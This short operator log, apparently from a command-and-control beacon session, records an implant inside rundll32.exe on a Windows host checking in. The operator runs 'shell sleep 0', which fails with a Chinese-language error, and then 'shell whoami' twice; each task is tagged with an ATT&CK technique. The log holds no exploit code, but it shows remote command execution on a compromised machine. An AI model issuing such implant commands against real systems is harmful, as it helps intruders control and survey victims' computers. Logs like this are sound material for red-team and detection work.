03/28 06:33:26 UTC [metadata] 192.168.199.231 <- 192.168.199.231; computer: READER-L-PC; user: reader-l; process: rundll32.exe; pid: 3612; os: Windows; version: 6.1; beacon arch: x86 (x64)
03/28 06:34:17 UTC [checkin] host called home, sent: 19 bytes
03/28 06:35:14 UTC [input] <reader> shell sleep 0
03/28 06:35:14 UTC [task] <T1059> Tasked beacon to run: sleep 0
03/28 06:35:17 UTC [checkin] host called home, sent: 38 bytes
03/28 06:35:17 UTC [output]
received output:
'sleep' 不是内部或外部命令，也不是可运行的程序
或批处理文件。


03/28 06:35:21 UTC [input] <reader> sleep 0
03/28 06:35:21 UTC [task] <T1029> Tasked beacon to become interactive
03/28 06:35:39 UTC [input] <reader> sleep 0
03/28 06:35:39 UTC [task] <T1029> Tasked beacon to become interactive
03/28 06:35:44 UTC [input] <reader> shell whoami
03/28 06:35:44 UTC [task] <T1059> Tasked beacon to run: whoami
03/28 06:35:49 UTC [input] <reader> shell whoami
03/28 06:35:49 UTC [task] <T1059> Tasked beacon to run: whoami
03/28 06:36:18 UTC [checkin] host called home, sent: 106 bytes
03/28 06:36:18 UTC [output]
received output:
reader-l-pc\reader-l


03/28 06:36:18 UTC [output]
received output:
reader-l-pc\reader-l


